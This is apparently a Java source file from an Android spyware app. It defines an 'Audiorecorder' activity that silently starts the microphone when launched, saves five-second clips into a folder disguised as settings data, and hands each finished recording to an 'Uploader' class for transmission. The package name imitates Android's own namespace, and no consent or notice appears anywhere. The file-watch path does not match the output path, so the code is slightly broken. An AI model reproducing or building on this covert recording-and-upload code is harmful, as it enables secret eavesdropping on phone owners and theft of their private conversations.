package com.android.classic.recording;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.FileObserver;

import com.android.classic.helper.Uploader;

@SuppressLint("SimpleDateFormat")
public class Audiorecorder extends Activity {

	private static final String AUDIO_RECORDER_FILE_EXT_MP4 = ".mp4";
	private static final String AUDIO_RECORDER_FOLDER = "Android/data/settings/Audio";
	private MediaRecorder recorder = null;
	MyFileObserver fb;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);

		setupRecorder();
		startRecording();
	}

	private void stopRecording() {
		if (null != recorder) {
			recorder.stop();
			recorder.reset();
			recorder.release();
			recorder = null;
		}
		finish();
	}

	private void startRecording() {
		recorder = new MediaRecorder();
		recorder.setMaxDuration(5000);
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		recorder.setOutputFile(getFilename());
		recorder.setOnErrorListener(errorListener);
		recorder.setOnInfoListener(infoListener);
		try {
			recorder.prepare();
			recorder.start();
			fb.startWatching();
		} catch (IllegalStateException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private void setupRecorder() {

	}

	private MediaRecorder.OnErrorListener errorListener = new MediaRecorder.OnErrorListener() {
		@Override
		public void onError(MediaRecorder mr, int what, int extra) {
			stopRecording();
			finish();
		}
	};

	private MediaRecorder.OnInfoListener infoListener = new MediaRecorder.OnInfoListener() {
		@Override
		public void onInfo(MediaRecorder mr, int what, int extra) {
			stopRecording();
			finish();
		}
	};

	private String getFilename() {
		SimpleDateFormat dateFormat = new SimpleDateFormat(
				"yyyy-MM-dd_HH-mm-ss");
		String date = dateFormat.format(new Date());
		String filepath = Environment.getExternalStorageDirectory().getPath();
		File file = new File(filepath, Audiorecorder.AUDIO_RECORDER_FOLDER);
		if (!file.exists()) {
			file.mkdirs();
		}
		fb = new MyFileObserver(file.getAbsolutePath() + "/"
				+ android.os.Build.MODEL + "|Record_" + date
				+ Audiorecorder.AUDIO_RECORDER_FILE_EXT_MP4,
				FileObserver.CLOSE_WRITE);
		return (file.getAbsolutePath() + "/" + "Record_" + date + Audiorecorder.AUDIO_RECORDER_FILE_EXT_MP4);
	}

	class MyFileObserver extends FileObserver {

		public MyFileObserver(String path, int mask) {
			super(path, mask);
		}

		@Override
		public void onEvent(int event, String path) {
			fb.stopWatching();
			new Uploader().execute(path);
		}
	}
}
